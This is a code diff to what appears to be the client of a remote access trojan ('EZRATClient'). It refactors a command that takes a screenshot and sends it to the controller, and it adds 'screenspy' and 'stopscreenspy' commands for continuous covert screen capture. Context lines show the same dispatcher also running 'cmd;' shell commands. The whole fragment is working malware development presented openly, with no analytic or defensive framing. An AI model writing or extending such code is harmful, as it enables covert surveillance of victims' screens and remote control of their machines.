@@ -162,12 +162,7 @@ namespace EZRATClient.Core
             }
             else if (text == "scrnshot;")
             {
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
-                    string result = "scrnshot;" + Encoding.Default.GetString(ms.ToArray());
-                    Program.SendCommand(result);
-                }
+                Program.SendCommand("scrnshot;" + CommandExecutor.TakeScreenShot());
             }
             else if (text.StartsWith("cmd;"))
             {
@@ -235,6 +230,12 @@ namespace EZRATClient.Core
                         break;
                 }
                 MessageBox.Show(value, title, MessageBoxButtons.OK, i);
+            } else if (text.StartsWith("screenspy;"))
+            {
+                CommandExecutor.ScreenSpyThread();
+            } else if(text.StartsWith("stopscreenspy;"))
+            {
+                CommandExecutor.StopScreenSpyThread();
             }
         }
     }
